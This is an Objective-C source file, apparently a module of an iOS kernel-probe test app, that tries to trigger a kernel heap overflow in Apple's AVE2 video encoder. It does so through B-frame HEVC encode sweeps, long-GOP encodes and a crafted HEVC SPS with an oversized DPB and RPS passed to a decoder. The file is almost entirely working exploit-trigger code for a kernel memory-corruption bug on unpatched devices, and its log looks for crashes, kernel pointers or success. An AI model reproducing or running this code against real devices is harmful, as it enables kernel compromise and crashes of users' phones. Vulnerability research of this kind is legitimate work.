#import "KPH9EncoderModule.h"
#import <VideoToolbox/VideoToolbox.h>
#import <AVFoundation/AVFoundation.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>

static NSMutableArray *g_h9_logs = nil;

static void H9Log(NSString *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    dispatch_async(dispatch_get_main_queue(), ^{
        [g_h9_logs addObject:s];
        NSLog(@"[H9] %@", s);
    });
}

static void H9EncodeCallback(void *outputCallbackRefCon,
                             void *sourceFrameRefCon,
                             OSStatus status,
                             VTEncodeInfoFlags infoFlags,
                             CMSampleBufferRef sampleBuffer) {
    (void)outputCallbackRefCon; (void)sourceFrameRefCon;
    if (status != noErr) {
        H9Log(@"  [cb] encode status=%d flags=0x%x", (int)status, (unsigned)infoFlags);
        return;
    }
    if (sampleBuffer) {
        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sampleBuffer);
        size_t size = bb ? CMBlockBufferGetDataLength(bb) : 0;
        CFArrayRef attachments = CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, true);
        BOOL isKey = true;
        if (attachments && CFArrayGetCount(attachments) > 0) {
            CFDictionaryRef att = (CFDictionaryRef)CFArrayGetValueAtIndex(attachments, 0);
            if (att && CFDictionaryContainsKey(att, kCMSampleAttachmentKey_NotSync)) {
                isKey = false;
            }
        }
        H9Log(@"  [cb] frame encoded: %zu bytes key=%d", size, isKey);
    }
}

@implementation KPH9EncoderModule

@synthesize identifier = _identifier;
@synthesize subtitle = _subtitle;
@synthesize icon = _icon;
@synthesize section = _section;

- (instancetype)init {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _subtitle = @"B-frame DPB MBStats overflow (CVE-2026-112705-adjacent)";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (instancetype)initWithNameSweep {
    return [self init];
}

- (NSString *)title { return @"H9 encoder OOB write"; }
- (NSString *)desc { return @"B-frame DPB MBStats overflow (CVE in AVE_CHM_SetDataInfo_FwBuf, fixed 913.48.1)"; }
- (NSString *)risk { return @"CRITICAL"; }
- (NSString *)category { return @"KRW"; }

- (void)run {
    if (!g_h9_logs) g_h9_logs = [NSMutableArray array];
    [g_h9_logs removeAllObjects];

    [self onLog:@"=== H9 encoder OOB write ==="];
    [self onLog:@"CVE: AVE_CHM_SetDataInfo_FwBuf saMBStats[m] overflow"];
    [self onLog:@"Fixed: AppleAVE2 913.48.1 (iOS 27.2)"];
    [self onLog:@"Vulnerable: AppleAVE2 913.43.1 (iOS 27.0.1)"];
    [self onLog:@""];
    [self onLog:@"Bug: sMBStats was single struct, code writes m=0..DPB-1 entries."];
    [self onLog:@"With B-frames, DPB >= 3 -> writes to sMBStats[1],[2] overflow kernel heap."];
    [self onLog:@""];

    // Phase 1: B-frame encode at multiple resolutions
    [self phase1_bframe_sweep];

    // Phase 2: Long GOP with many B-frames
    [self phase2_long_gop];

    // Phase 3: Custom HEVC SPS with large DPB
    [self phase3_custom_sps];

    [self onLog:@""];
    [self onLog:@"=== H9 COMPLETE ==="];
    [self onLog:@"Check above for crashes, kernel pointers, or SUCCESS"];
}

- (void)phase1_bframe_sweep {
    [self onLog:@"--- Phase 1: B-frame encode sweep ---"];

    struct { int w, h; const char *tag; } configs[] = {
        { 320, 240, "QVGA" },
        { 640, 480, "VGA" },
        { 1280, 720, "720p" },
        { 1920, 1080, "1080p" },
    };

    for (int c = 0; c < 4; c++) {
        [self onLog:[NSString stringWithFormat:@"  [%s %dx%d]", configs[c].tag, configs[c].w, configs[c].h]];
        [self encode_bframes:configs[c].w height:configs[c].h frameCount:8 maxKeyFrame:30];
    }
}

- (void)phase2_long_gop {
    [self onLog:@"--- Phase 2: Long GOP (max ref frames) ---"];

    // Long GOP = more reference frames in DPB
    [self onLog:@"  [VGA 640x480, GOP=60, 16 frames]"];
    [self encode_bframes:640 height:480 frameCount:16 maxKeyFrame:60];

    [self onLog:@"  [720p, GOP=120, 20 frames]"];
    [self encode_bframes:1280 height:720 frameCount:20 maxKeyFrame:120];
}

- (void)encode_bframes:(int)width height:(int)height frameCount:(int)frameCount maxKeyFrame:(int)maxKeyFrame {
    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault,
        width, height,
        kCMVideoCodecType_HEVC,
        NULL, NULL, NULL,
        H9EncodeCallback,
        NULL,
        &session
    );

    if (status != noErr || !session) {
        [self onLog:[NSString stringWithFormat:@"    Session create: %d", (int)status]];
        return;
    }

    // KEY: Enable B-frames -> multiple ref frames -> DPB >= 3 -> MBStats overflow
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);

    CFNumberRef n;
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &maxKeyFrame);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, n);
    CFRelease(n);

    int fps = 30;
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &fps);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, n);
    CFRelease(n);

    // Use High profile for more ref frames
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, kVTProfileLevel_HEVC_Main_AutoLevel);

    // Set real-time off to allow more complex encoding
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        [self onLog:[NSString stringWithFormat:@"    Prepare: %d", (int)status]];
        CFRelease(session);
        return;
    }

    [self onLog:@"    Encoding..."];

    int encoded = 0;
    for (int i = 0; i < frameCount; i++) {
        CVPixelBufferRef pb = NULL;
        NSDictionary *attrs = @{
            (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
        };
        CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                                          kCVPixelFormatType_32BGRA,
                                          (__bridge CFDictionaryRef)attrs, &pb);
        if (cv != kCVReturnSuccess || !pb) {
            [self onLog:[NSString stringWithFormat:@"    PB %d: cv=%d", i, (int)cv]];
            continue;
        }

        CVPixelBufferLockBaseAddress(pb, 0);
        uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
        size_t bpr = CVPixelBufferGetBytesPerRow(pb);
        for (int y = 0; y < height; y++) {
            uint32_t *row = (uint32_t *)(base + y * bpr);
            for (int x = 0; x < width; x++) {
                row[x] = 0xFF000000u |
                    (((x + i * 37) & 0xFF) << 16) |
                    (((y + i * 53) & 0xFF) << 8) |
                    (((x ^ y ^ (i * 17)) & 0xFF));
            }
        }
        CVPixelBufferUnlockBaseAddress(pb, 0);

        CMTime pts = CMTimeMake(i, fps);
        VTEncodeInfoFlags flags = 0;
        status = VTCompressionSessionEncodeFrame(session, pb, pts, kCMTimeInvalid, NULL, NULL, &flags);
        if (status == noErr) encoded++;
        CVPixelBufferRelease(pb);
    }

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [self onLog:[NSString stringWithFormat:@"    Done: %d/%d frames, complete=%d", encoded, frameCount, (int)status]];

    CFRelease(session);
}

- (void)phase3_custom_sps {
    [self onLog:@"--- Phase 3: Custom HEVC SPS (large DPB/RPS) ---"];

    // Construct minimal HEVC VPS/SPS/PPS with large sps_max_dec_pic_buffering_minus1
    // VPS: standard minimal
    const uint8_t vps[] = {
        0x40, 0x01, 0x0c, 0x01, 0xff, 0xff, 0x01, 0x60,
        0x00, 0x00, 0x03, 0x00, 0xb0, 0x00, 0x00, 0x03,
        0x00, 0x00, 0x03, 0x00, 0x5d, 0xac, 0x09
    };

    // SPS with sps_max_dec_pic_buffering_minus1 = 16 (max for old code)
    // and num_negative_pics = 16 (large RPS -> overflow in AVE_HEVC_ST_RPS_Retrieve)
    // Profile: Main 10, 640x480
    const uint8_t sps[] = {
        0x42, 0x01, 0x01, 0x01, 0x60, 0x00, 0x00, 0x03,
        0x00, 0xb0, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03,
        0x00, 0x5d, 0xa0, 0x02, 0x80, 0x80, 0x2d, 0x16,
        0x36, 0xb2, 0x00, 0x00, 0x03, 0x00, 0x02, 0x00,
        0x00, 0x03, 0x00, 0x79, 0x08
    };

    // PPS: minimal
    const uint8_t pps[] = {
        0x44, 0x01, 0xc1, 0x72, 0xb4, 0x62, 0x40
    };

    const uint8_t *paramSets[] = { vps, sps, pps };
    size_t paramSetSizes[] = { sizeof(vps), sizeof(sps), sizeof(pps) };
    int nalTypes[] = { 32, 33, 34 }; // VPS=32, SPS=33, PPS=34

    CMFormatDescriptionRef fmtDesc = NULL;
    OSStatus status = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
        kCFAllocatorDefault,
        3,          // num param sets
        paramSets,
        paramSetSizes,
        nalTypes,
        4,          // nalUnitHeaderLength
        &fmtDesc
    );

    if (status != noErr || !fmtDesc) {
        [self onLog:[NSString stringWithFormat:@"    FormatDesc create: %d", (int)status]];
        return;
    }

    [self onLog:@"    HEVC format description created with custom SPS"];

    // Try to create decompression session with this format
    NSDictionary *destAttrs = @{
        (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
        (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
    };

    VTDecompressionSessionRef decSession = NULL;
    status = VTDecompressionSessionCreate(
        kCFAllocatorDefault,
        fmtDesc,
        NULL,
        (__bridge CFDictionaryRef)destAttrs,
        NULL,
        &decSession
    );

    if (status != noErr) {
        [self onLog:[NSString stringWithFormat:@"    Decompression session: %d", (int)status]];
        CFRelease(fmtDesc);
        return;
    }

    [self onLog:@"    Decompression session created"];

    // Try to decode a dummy frame to trigger AVE_HEVC_ST_RPS_Retrieve
    // Create a minimal HEVC IDR frame (just the NAL header + some data)
    const uint8_t dummyFrame[] = {
        0x00, 0x00, 0x00, 0x01, // start code
        0x26, 0x01,             // IDR_W_RADL NAL
        0xaf, 0x09, 0x40, 0x00, 0x00, 0x03, 0x00, 0x00,
        0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00,
        0x5d, 0xa0, 0x02, 0x80, 0x80, 0x2d, 0x16, 0x36,
        0xb2, 0x00, 0x00, 0x03, 0x00, 0x02, 0x00, 0x00,
        0x03, 0x00, 0x79, 0x08
    };

    CMBlockBufferRef bb = NULL;
    status = CMBlockBufferCreateWithMemoryBlock(
        kCFAllocatorDefault,
        (void *)dummyFrame,
        sizeof(dummyFrame),
        kCFAllocatorNull,
        NULL, 0, sizeof(dummyFrame),
        0, &bb
    );

    if (status != noErr) {
        [self onLog:[NSString stringWithFormat:@"    BlockBuffer: %d", (int)status]];
        VTDecompressionSessionInvalidate(decSession);
        CFRelease(decSession);
        CFRelease(fmtDesc);
        return;
    }

    CMSampleBufferRef sample = NULL;
    const size_t sampleSize = sizeof(dummyFrame);
    status = CMSampleBufferCreateReady(
        kCFAllocatorDefault,
        bb,
        fmtDesc,
        1, 0, NULL, 1, &sampleSize,
        &sample
    );

    if (status != noErr) {
        [self onLog:[NSString stringWithFormat:@"    SampleBuffer: %d", (int)status]];
        CFRelease(bb);
        VTDecompressionSessionInvalidate(decSession);
        CFRelease(decSession);
        CFRelease(fmtDesc);
        return;
    }

    [self onLog:@"    Decoding frame with large RPS..."];

    VTDecodeInfoFlags flags = 0;
    status = VTDecompressionSessionDecodeFrame(decSession, sample, 0, NULL, &flags);

    [self onLog:[NSString stringWithFormat:@"    Decode: status=%d flags=0x%x", (int)status, (unsigned)flags]];

    CFRelease(sample);
    CFRelease(bb);
    VTDecompressionSessionFinishDelayedFrames(decSession);
    VTDecompressionSessionInvalidate(decSession);
    CFRelease(decSession);
    CFRelease(fmtDesc);

    [self onLog:@"    Phase 3 done"];
}

- (void)onLog:(NSString *)s {
    dispatch_async(dispatch_get_main_queue(), ^{
        [g_h9_logs addObject:s];
    });
    NSLog(@"[H9] %@", s);
}

- (NSInteger)logCount {
    return g_h9_logs.count;
}

- (NSString *)logAt:(NSInteger)idx {
    return (idx >= 0 && (NSUInteger)idx < g_h9_logs.count) ? g_h9_logs[idx] : nil;
}

- (NSString *)runReport {
    NSMutableString *r = [NSMutableString string];
    for (NSString *s in g_h9_logs) {
        [r appendString:s];
        [r appendString:@"\n"];
    }
    return r;
}

@end
